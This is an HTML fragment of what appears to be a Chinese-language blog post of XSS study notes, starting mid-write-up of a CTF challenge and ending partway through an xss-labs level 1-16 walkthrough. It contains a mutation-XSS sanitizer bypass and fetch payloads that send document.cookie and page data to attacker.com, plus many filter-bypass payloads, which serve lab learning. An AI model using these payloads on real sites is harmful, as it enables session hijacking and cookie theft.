class="code"><pre><span class="line">&lt;form&gt;&lt;/form&gt; </span><br><span class="line">&lt;math&gt;&lt;mtext&gt;&lt;/mtext&gt;&lt;/math&gt; </span><br></pre></td></tr></table></figure></li><li><p>åç»­&lt;style&gt;ã€æ˜¯åœ¨htmlçš„æ ‡ç­¾ï¼Œå‡ºç°åœ¨mathmlä¸­ã€‘,&lt;&#x2F;math&gt;ä½¿å¾—è§£é‡Šå™¨æ··æ·†è§¦å‘é—­åˆ&lt;form&gt;</p></li><li><p><code>malignmark</code>æ ‡ç­¾åé•¿åº¦æ˜¯10ï¼Œä¸ä¼šè¢«åˆ é™¤<code>style</code>æ ‡ç­¾åé•¿åº¦æ˜¯5ï¼Œä¸ä¼šè¢«åˆ é™¤<code>img</code>æ ‡ç­¾åé•¿åº¦æ˜¯3</p></li></ol><p>è§£é‡Šå™¨å¤„ç†æ—¶é—´ï¼š</p><p>DOM å˜å¼‚åœ¨ <code>innerHTML</code>èµ‹å€¼æ—¶å·²ç»å‘ç”Ÿ</p><p><code>onerror</code>åœ¨å±æ€§ç§»é™¤å‰å·²ç»ç”Ÿæ•ˆ</p><p>é¡¹ç›®ä¼šè®©xss-botæ¥è§¦å‘è®¿é—®è¯¥é“¾ï¼Œè¦è·å¾—å…¶cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;malignmark&gt;&lt;style&gt;&lt;/math&gt;&lt;img src=1 onerror=&quot;fetch(`https://attacker.com/steal?cookie=$&#123;encodeURIComponent(document.cookie)&#125;`)&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;https://attacker.com/steal&#x27;, &#123;</span><br><span class="line">  method: &#x27;POST&#x27;,</span><br><span class="line">  headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;,</span><br><span class="line">  body: JSON.stringify(&#123;</span><br><span class="line">    cookie: document.cookie,</span><br><span class="line">    url: location.href,</span><br><span class="line">    userAgent: navigator.userAgent</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æ‰‹æ“çš„å¹³å°æ­å»ºè·å–cookieæ–¹å¼</p><p>è¿™é¢˜çš„å…³é”®ç‚¹æ˜¯æ··æ·†è§£æå™¨ï¼Œåœ¨mathmlç©ºé—´ä¸­æ ‡ç­¾å’Œhtmlç©ºé—´ä¸­æ ‡ç­¾çš„å·®å¼‚ï¼Œå¼•èµ·è§£æå™¨å¯¹äºå¼‚å¸¸ä»£ç çš„å¤„ç†</p><h1 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h1><p>æœ‰äº›å¼•ç”¨åœ¨æ–‡ç« å½“ä¸­</p><p><a href="https://blog.csdn.net/2301_80637449/article/details/153076191">XSS æ¼æ´å…¨è§£æï¼šä»åŸç†åˆ°å®æˆ˜-CSDNåšå®¢</a></p><p><a href="https://xz.aliyun.com/news/12336">XSSåŸç†åˆ†æä¸ç»•è¿‡æ€»ç»“-å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://xz.aliyun.com/news/3699">XSSæ€»ç»“-å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://www.freebuf.com/vuls/423546.html">XSS æ¼æ´æ·±åº¦è§£æï¼šæ”»é˜²å¯¹æŠ—ä¸é«˜é˜¶åˆ©ç”¨ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://www.sqlsec.com/2020/10/xss2.html#%E6%80%BB%E7%BB%93">XSS æ”»å‡»æ€è·¯æ€»ç»“ | å›½å…‰</a></p><p><a href="https://www.sqlsec.com/2020/01/xss.html">XSS ä»é›¶å¼€å§‹ | å›½å…‰</a></p><p><a href="https://www.bilibili.com/video/BV123yAYMEwb/?p=53&share_source=copy_web&vd_source=46dcac097257d547144350b30f96978c">https://www.bilibili.com/video/BV123yAYMEwb/?p=53&amp;share_source=copy_web&amp;vd_source=46dcac097257d547144350b30f96978c</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>XSS æ˜¯æ”»å‡»è€…é€šè¿‡åœ¨ç½‘é¡µä¸­æ³¨å…¥æ¶æ„ JavaScript è„šæœ¬ï¼Œå½“ç”¨æˆ·è®¿é—®è¢«æ³¨å…¥çš„é¡µé¢æ—¶ï¼Œè„šæœ¬åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°çªƒå– cookieã€åŠ«æŒä¼šè¯ã€é’“é±¼æ”»å‡»ç­‰æ¶æ„æ“ä½œçš„æ¼æ´ã€‚å…¶æœ¬è´¨æ˜¯Web åº”ç”¨å¯¹ç”¨æˆ·è¾“å…¥çš„è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´æœªç»è¿‡æ»¤çš„è¾“å…¥è¢«å½“ä½œ HTML&#x2F;JavaScript ä»£ç åœ¨æµè§ˆå™¨ä¸­è§£ææ‰§è¡Œã€‚</p><h1 id="XSS-åˆ†ç±»"><a href="#XSS-åˆ†ç±»" class="headerlink" title="XSS åˆ†ç±»"></a>XSS åˆ†ç±»</h1><h2 id="åå°„å‹-XSS"><a href="#åå°„å‹-XSS" class="headerlink" title="åå°„å‹ XSS"></a><strong>åå°„å‹ XSS</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ¶æ„è„šæœ¬é€šè¿‡ URL å‚æ•°ä¼ å…¥ï¼ŒæœåŠ¡å™¨æœªè¿‡æ»¤ç›´æ¥è¿”å›é¡µé¢ä¸­</span><br><span class="line">éæŒä¹…åŒ–ï¼Œéœ€è¯±éª—ç”¨æˆ·ç‚¹å‡»å«æ¶æ„å‚æ•°çš„ URL</span><br><span class="line">é€‚åˆé’“é±¼æ”»å‡»ï¼ˆå¦‚ä¼ªé€ ç™»å½•é“¾æ¥ï¼‰ã€ä¸€æ¬¡æ€§ä¼šè¯åŠ«æŒ</span><br></pre></td></tr></table></figure><h2 id="å­˜å‚¨å‹-XSS"><a href="#å­˜å‚¨å‹-XSS" class="headerlink" title="å­˜å‚¨å‹ XSS"></a><strong>å­˜å‚¨å‹ XSS</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ¶æ„è„šæœ¬è¢«å­˜å‚¨åˆ°æœåŠ¡å™¨ï¼ˆå¦‚æ•°æ®åº“ã€æ–‡ä»¶ï¼‰ï¼Œç”¨æˆ·è®¿é—®é¡µé¢æ—¶è¢«åŠ è½½æ‰§è¡Œ</span><br><span class="line">æŒä¹…åŒ–ï¼Œæ‰€æœ‰è®¿é—®è¯¥é¡µé¢çš„ç”¨æˆ·éƒ½ä¼šè§¦å‘</span><br><span class="line">å±å®³æœ€å¤§ï¼Œå¯æ‰¹é‡æ”»å‡»ï¼ˆå¦‚è®ºå›ã€ç•™è¨€æ¿ï¼‰ã€é•¿æœŸæ§åˆ¶ç›®æ ‡</span><br></pre></td></tr></table></figure><h2 id="DOM-å‹-XSS"><a href="#DOM-å‹-XSS" class="headerlink" title="DOM å‹ XSS"></a><strong>DOM å‹ XSS</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ¶æ„è„šæœ¬æœªç»è¿‡æœåŠ¡å™¨ï¼Œä»…åœ¨å®¢æˆ·ç«¯é€šè¿‡ JavaScript æ“ä½œ DOM æ—¶æ³¨å…¥</span><br><span class="line">å®Œå…¨åœ¨å®¢æˆ·ç«¯æ‰§è¡Œï¼ŒæœåŠ¡å™¨å“åº”ä¸­æ— æ¶æ„ä»£ç </span><br><span class="line">éš¾è¢«æœåŠ¡å™¨ç«¯ WAF æ£€æµ‹ï¼Œé€‚åˆç»•è¿‡é˜²æŠ¤æœºåˆ¶</span><br></pre></td></tr></table></figure><h1 id="xssé¶åœº"><a href="#xssé¶åœº" class="headerlink" title="xssé¶åœº"></a>xssé¶åœº</h1><h2 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h2><p>ã€åŸºç¡€è®¤è¯†ã€‘</p><p><a href="https://www.cnblogs.com/L00kback/p/17552275.html">xss-labsé¶åœº1-20å…³è¯¦è§£ - L00kback - åšå®¢å›­</a></p><p><a href="https://skywt.cn/blog/xss-labs-tutorial#level-1%E6%96%87%E6%9C%AC%E8%A7%A3%E6%9E%90%E4%B8%BA-html">xss-labs é€šå…³æ•™ç¨‹ - åšå®¢</a></p><h3 id="leve1"><a href="#leve1" class="headerlink" title="leve1"></a>leve1</h3><p><img src="/../images/image-20251017141145726.png" alt="image-20251017141145726"></p><p>ä»£ç ç›´æ¥å°†ä»URLå‚æ•°<code>name</code>è·å–çš„ç”¨æˆ·è¾“å…¥ï¼ˆ<code>$str</code>ï¼‰æ‹¼æ¥è¿›HTMLé¡µé¢è¾“å‡º</p><p>æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤æˆ–è½¬ä¹‰å¤„ç†,ç›´æ¥æ³¨å…¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="leve2"><a href="#leve2" class="headerlink" title="leve2"></a>leve2</h3><p><img src="/../images/image-20251017141918087.png" alt="image-20251017141918087"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars($str)  å°†å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨è¡¨å•å½“ä¸­çš„valueå€¼æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œåœ¨è¿™é‡Œå¯ä»¥è¿›è¡Œæ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å°†è¿™ä¸€å¥çš„value=&quot;x&quot;&gt;</span><br><span class="line">xå¦‚æœå¡«å…¥&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;å°±ç­‰äºæ’å…¥äº†ä¸€å¥jsä»£ç </span><br><span class="line">value=&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="leve3"><a href="#leve3" class="headerlink" title="leve3"></a>leve3</h3><p><img src="/../images/image-20251017142811091.png" alt="image-20251017142811091"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ 8.1.0 åŠä»¥ä¸Šçš„ PHP ç‰ˆæœ¬ä¸­ï¼Œè¿™ä¸ªå‡½æ•°é»˜è®¤ä¼šè½¬ä¹‰ &lt;ã€&gt;ã€&amp;ã€&#x27;ã€&quot; è¿™äº”ä¸ªå­—ç¬¦ï¼ŒåŸºæœ¬å¯ä»¥é˜²èŒƒè¿™é‡Œçš„ XSS æ”»å‡»ã€‚</span><br><span class="line">ä½†æ˜¯ï¼Œ8.1.0 ä»¥ä¸‹ç‰ˆæœ¬çš„ PHP é»˜è®¤åªä¼šè½¬ä¹‰ &lt;ã€&gt;ã€&amp;ã€&quot; è¿™å››ä¸ªå­—ç¬¦ï¼Œä¸ä¼šè½¬ä¹‰å•å¼•å· &#x27;ã€‚è¿™å°±ç»™è¿™ä¸ªå‡½æ•°å¸¦æ¥äº†å·¨å¤§çš„å®‰å…¨éšæ‚£ã€‚</span><br><span class="line"></span><br><span class="line">&lt;8.1.0</span><br><span class="line">htmlspecialchars()å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“</span><br><span class="line">é¢„å®šä¹‰çš„å­—ç¬¦æœ‰ï¼š</span><br><span class="line"> &amp; ï¼ˆå’Œå·ï¼‰æˆä¸º &amp;amp;</span><br><span class="line"> &quot; ï¼ˆåŒå¼•å·ï¼‰æˆä¸º &amp;quot;</span><br><span class="line"> &#x27; ï¼ˆå•å¼•å·ï¼‰æˆä¸º &#x27;</span><br><span class="line"> &lt; ï¼ˆå°äºï¼‰æˆä¸º &amp;lt;</span><br><span class="line"> &gt; ï¼ˆå¤§äºï¼‰æˆä¸º &amp;gt;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨â€™æ¥é—­åˆvalue&#x3D;â€™â€™ ä½†æ˜¯&lt;è¢«è¿‡æ»¤æˆäº†&amp;1t é‚£ä¹ˆå°±æ„é€ ä¸å‡ºé¢å¤–çš„è¯­å¥ï¼Œåœ¨å¥å†…æ„é€ å¯ä»¥ä½¿ç”¨åˆ°è§¦å‘å™¨é¼ æ ‡ç‚¹å‡»äº‹ä»¶<code>onfocus``onclinck``onmouseover</code>ç­‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onmouseover=javascript:alert(1)</span><br><span class="line">&#x27; onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure><h3 id="leve4"><a href="#leve4" class="headerlink" title="leve4"></a>leve4</h3><p><img src="/../images/image-20251017144147810.png" alt="image-20251017144147810"></p><p>è¿™é‡Œçš„valueæ²¡æœ‰ä½¿ç”¨htmlspecialchar()æ¥è½¬ä¹‰ï¼Œä½†æ˜¯ä½¿ç”¨äº†str_replace()æ¥å°†&lt;å’Œ&gt;è½¬åŒ–æˆç©ºæ ¼ å¯ä»¥ä½¿ç”¨â€â€é—­åˆvalueæ„é€ payload ä½†æ˜¯ä¸èƒ½ä½¿ç”¨&lt;å’Œ&gt; é‚£å°±å¯ä»¥ç»§ç»­ä½¿ç”¨è§¦å‘å™¨æ¥è¿›è¡Œè¿‡æ»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick=&quot;alert(1)</span><br><span class="line">&quot;onmouseover=alert(1)&quot;</span><br></pre></td></tr></table></figure><h3 id="leve5"><a href="#leve5" class="headerlink" title="leve5"></a>leve5</h3><p><img src="/../images/image-20251017145015924.png" alt="image-20251017145015924"></p><p>è¿™é‡Œçš„valueä¾æ—§æ²¡æœ‰ä½¿ç”¨htmlspecialchar()æ¥è½¬ä¹‰ï¼Œä½†æ˜¯ä½¿ç”¨äº†str_replace()æ¥å°†&lt;scriptå’Œonè½¬åŒ–å¸¦ä¸‹åˆ’çº¿çš„å½¢å¼ è¯´æ˜ä¸èƒ½ä½¿ç”¨é¼ æ ‡è§¦å‘äº‹ä»¶äº†å› ä¸ºéƒ½å¸¦ç€onï¼Œå¯ä»¥åˆ©ç”¨ JavaScript çš„ URI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt; æ ‡ç­¾çš„ href å€¼å¹¶éåªèƒ½æ˜¯ URLï¼Œè€Œæ˜¯ URIã€‚URIï¼ˆUniform Resource Identifierï¼‰å¯ä»¥è§†ä¸º URL çš„è¶…é›†ï¼Œå…¶ä¸ä»…åŒ…å«ä»¥ protocol://address å¼€å¤´çš„ URLï¼Œä¹ŸåŒ…å« protocol:content è¿™ç§å½¢å¼çš„åœ°å€ï¼ˆå‚è§ RFC 3986ï¼‰ã€‚ç»å¸¸ç”¨åˆ°çš„æœ‰ï¼šjavascript: åæ¥ js ä»£ç ï¼Œè¿™æ ·çš„ URI æ‰“å¼€åä¼šè¿è¡Œä¸€æ®µ js ä»£ç ï¼›mailto: åæ¥ä¸€ä¸ªé‚®ç®±ï¼Œè¿™æ ·çš„ URI æ‰“å¼€åä¼šå¼€å¯ç³»ç»Ÿä¸­çš„é‚®ç®±ç±»åº”ç”¨ç¨‹åºï¼Œåˆ›å»ºå‘é€ç»™ç›®æ ‡åœ°å€çš„ä¸€å°é‚®ä»¶ã€‚</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨â€&gt;é—­åˆå‰ä¸€å¥ï¼Œå†æ„é€ <a></a>è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="leve6"><a href="#leve6" class="headerlink" title="leve6"></a>leve6</h3><p><img src="/../images/image-20251017145811434.png" alt="image-20251017145811434"></p><p>è¿‡æ»¤å¢åŠ äº†src,data,href</p><p>HTML å¹¶ä¸åŒºåˆ†å¤§å°å†™,æ‰€ä»¥æ‰€ä»¥å°† href æ›¿æ¢å¤§å°å†™å°±å¥½äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrEf=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="leve7"><a href="#leve7" class="headerlink" title="leve7"></a>leve7</h3><p>è·Ÿ6ä¸ä¸€æ ·æ˜¯ç®€å•è¿‡æ»¤ï¼Œè€Œæ˜¯å…¨éƒ¨ç½®ç©ºäº†</p><p><img src="/../images/image-20251017174535233.png" alt="image-20251017174535233"></p><p>ç»å…¸çš„åªè¿‡æ»¤äº†ä¸€æ¬¡ï¼Œåªè¦æ„é€ äº†è¿‡æ»¤ä¹‹åè¿˜æ˜¯èƒ½ä½¿ç”¨çš„payloadå°±è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;scriscriptpt&gt;alert(1);&lt;/scriscriptpt&gt;</span><br></pre></td></tr></table></figure><h3 id="leve8"><a href="#leve8" class="headerlink" title="leve8"></a>leve8</h3><p><img src="/../images/image-20251017183446774.png" alt="image-20251017183446774"></p><p>valueçš„å€¼è¢«htmlspecialchars()å‡½æ•°è¿‡æ»¤äº†ï¼Œä½†æ˜¯åœ¨<a>æ ‡ç­¾å½“ä¸­è¿˜æœ‰</p><p>æƒ³è¦æ„é€ javascript:alert(1)ï¼Œä½†æ˜¯ä¼šå˜æˆjavascr_ipt</p><p>hrefçš„å±æ€§ï¼šhref ä¼ å…¥çš„ URI ä¸­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ HTML å­—ç¬¦å®ä½“ã€‚åœ¨æ‰“å¼€é“¾æ¥æ—¶ï¼Œå­—ç¬¦å®ä½“ä¹Ÿä¼šè¢«è½¬æ¢ä¸ºå¯¹åº”çš„å­—ç¬¦ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTML å®ä½“æœ‰ä¸¤ç§å†™æ³•ï¼Œç¬¬ä¸€ç§æ˜¯ä¹‹å‰æåˆ°çš„ &amp;entity_name; å½¢å¼ï¼Œæ¯”å¦‚ $lt; è¡¨ç¤ºå°äºå·ï¼›ç¬¬äºŒç§æ˜¯ &amp;#entity_number; å½¢å¼ï¼Œå…¶ä¸­ entity_number æ˜¯å­—ç¬¦çš„å®ä½“ç¼–å·ï¼Œæ¯”å¦‚ &amp;#60; ä¹Ÿèƒ½è¡¨ç¤ºå°äºå·ã€‚ä½¿ç”¨ç¬¬äºŒç§æ–¹å¼ï¼Œä»»ä½•å­—ç¬¦ï¼ˆåŒ…æ‹¬ ASCII å­—ç¬¦ï¼‰éƒ½æœ‰å…¶å®ä½“è¡¨ç¤ºã€‚</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåªè¦å¯¹payloadè¿›è¡Œhtmlå®ä½“è½¬åŒ–å°±å¯ã€å…¨å±€å’Œéƒ¨åˆ†éƒ½å¯ä»¥ã€‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:alert(1)</span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure><h3 id="leve9"><a href="#leve9" class="headerlink" title="leve9"></a>leve9</h3><p><img src="/../images/image-20251018002224373.png" alt="image-20251018002224373"></p><p>åœ¨8çš„åŸºç¡€ä¸Šå¯¹åŠ å‹é“¾è¿›è¡Œäº†éªŒè¯æ˜¯å¦å«æœ‰http:&#x2F;&#x2F;å­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strpos()</span><br><span class="line">å‡½æ•°ç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾å­å­—ç¬¦ä¸²http://çš„ä½ç½®ã€‚å¦‚æœæ‰¾åˆ°äº†å­å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›å­å­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®ï¼ˆä¹Ÿå°±æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°å€¼ï¼‰ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°å­å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›falseã€‚</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±å¯ä»¥å¼€å§‹æ”¹é€ 8çš„payload,å°†http:&#x2F;&#x2F;æ³¨é‡Šæ‰å°±å¯ä»¥äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:alert(1)//http://</span><br></pre></td></tr></table></figure><h3 id="leve10"><a href="#leve10" class="headerlink" title="leve10"></a>leve10</h3><p><img src="/../images/image-20251018004243477.png" alt="image-20251018004243477"></p><p>æœ‰ä¸‰ä¸ªè¡¨å•æ˜¯hiddençš„ï¼Œä½†æ˜¯åªæœ‰t_sortå¯ä»¥getæ§åˆ¶ä»¥åŠå‚ä¸è§£æ</p><p>å…³äº&lt;&gt;çš„è¿‡æ»¤å°±å¯ä»¥é—­åˆvalueä½¿ç”¨é¼ æ ‡äº‹ä»¶ï¼Œä»¥åŠhiddenå¯ä»¥ä½¿ç”¨typeå¯¹åé¢çš„hiddenè¿›è¡Œé‡ç½®å°±ä¸ç”¨åœ¨htmlä¸Šé¢æ”¹å‡ºè¡¨å•å†æäº¤äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1&amp;t_sort=&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">?keyword=1&amp;t_sort=&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure><h3 id="leve11"><a href="#leve11" class="headerlink" title="leve11"></a>leve11</h3><p><img src="/../images/image-20251018005131086.png" alt="image-20251018005131086"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;HTTP_REFERER&#x27;]æ˜¯ä¸€ä¸ªPHPè¶…å…¨å±€å˜é‡ï¼Œç”¨äºè·å–å½“å‰é¡µé¢çš„å‰ä¸€ä¸ªé¡µé¢çš„URLåœ°å€ã€‚</span><br></pre></td></tr></table></figure><p>è·Ÿ10çš„åŒºåˆ«å°±æ˜¯å°†payloadæ”¾åˆ°äº†refå¤´ä¸Š</p><p><img src="/../images/image-20251018005401956.png" alt="image-20251018005401956"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Refererï¼š&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">Refererï¼š&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure><h3 id="leve12"><a href="#leve12" class="headerlink" title="leve12"></a>leve12</h3><p><img src="/../images/image-20251018005528385.png" alt="image-20251018005528385"></p><p>å’Œå‰é¢çš„ä¸€æ ·ï¼Œå°†payloadæ”¹åˆ°äº†uaå¤´ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agentï¼š&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">User-Agentï¼š&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure><h3 id="leve13"><a href="#leve13" class="headerlink" title="leve13"></a>leve13</h3><p><img src="/../images/image-20251018005742527.png" alt="image-20251018005742527"></p><p>å’Œå‰é¢çš„ä¸€æ ·ï¼Œå°†payloadæ”¹åˆ°äº†cookieå¤´ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookieï¼šuser=&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">Cookieï¼šuser=&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure><h3 id="leve14"><a href="#leve14" class="headerlink" title="leve14"></a>leve14</h3><p>ã€é“¾æ¥æ— æ•ˆã€‘</p><p><img src="/../images/image-20251018010324147.png" alt="image-20251018010324147"></p><p>æŸ¥çœ‹å›¾ç‰‡ exif ä¿¡æ¯çš„ç½‘ç«™</p><p>ä¿®æ”¹iframeè°ƒç”¨çš„æ–‡ä»¶æ¥å®ç°xssæ³¨å…¥</p><h3 id="leve15"><a href="#leve15" class="headerlink" title="leve15"></a>leve15</h3><p><img src="/../images/image-20251018010603698.png" alt="image-20251018010603698"></p><p>åœ¨ URL ä¸­æŒ‡å®šçš„ srcï¼ˆé»˜è®¤æ˜¯ 1.gifï¼‰ä¼šè¢«å¼•ç”¨è¿›æ¥ï¼Œä½¿ç”¨çš„æ˜¯ ng-includeã€‚è¿™æ˜¯ä¸€ä¸ª Angular æ¡†æ¶çš„åŠŸèƒ½ï¼Œç‰¹ç‚¹æ˜¯ï¼Œå¦‚æœå¼•å…¥çš„æ˜¯ HTML æ–‡ä»¶ï¼Œä¸ä¼šæ‰§è¡Œå…¶ä¸­ <code>&lt;script&gt;</code> æ ‡ç­¾å†…çš„ä»£ç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=level1.php?name=&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥å¼•ç”¨leve1çš„payloadï¼Œå½“ç„¶å¯ä»¥è‡ªå·±æ„é€ </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hacked<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å‡è®¾æ”¾åœ¨ç½‘ç«™æ ¹ç›®å½•ï¼Œpayload å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&quot;/alert.html&quot;</span><br></pre></td></tr></table></figure><h3 id="leve16"><a href="#leve16" class="headerlink" title="leve16"></a>leve16</h3><p><img src="/../images/image-20251018011553675.png" alt="image-20251018011553675"></p><p>å¯¹ç©ºæ ¼è¿›è¡Œäº†è¿‡æ»¤ï¼Œä½¿ç”¨æ¢è¡Œç¬¦ï¼ˆ<code>%0A</code>ï¼‰æˆ–è€…<code>%0d</code>ä¹Ÿå¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;img%0Asrc=1%0Aonerror=&quot;alert(1)&quot;&gt;</span><br><span 